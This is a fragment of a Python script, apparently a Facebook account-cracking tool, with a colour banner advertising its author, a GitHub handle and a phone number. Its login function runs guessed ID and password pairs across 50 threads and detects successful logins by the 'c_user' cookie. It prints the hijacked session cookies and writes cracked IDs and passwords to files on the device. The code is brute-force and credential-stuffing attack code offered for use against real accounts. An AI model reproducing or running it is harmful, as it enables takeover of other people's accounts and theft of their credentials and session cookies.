...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Admin                    • \33[1;38mMR-RAKIB  ]\33[1;38m    \033[1;31m 
╠══[Facebook                 • MD RAKIB  KING ]    \033[1;97m  
╠══[Github                   • \33[1;38mRAKIB-HACKING-TIM ]  \33[1;34m   
╠══[Number                   • 01724273808 ]  \33[1;35m 
╠══[TOOLS                    • FREE ]          \33[1;32m   
...
def RAKIB():
    ...
    with ThreadPool(max_workers=50) as ahare:
        ...
        print('\033[1;92m [❤️] ADMIN    MD RAKIB KING ')
        print('\033[1;92m [❤️] NUMBER  01724273808')
    ...
    print('Ok Ids Saved in /RAKIB-OK❤️.txt')
    print('Cp Ids Saved in /RAKIB-CP😭.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[RAKIB-OK❤️] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[RAKIB-CP😭]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/RAKIB-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mRAKIB\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
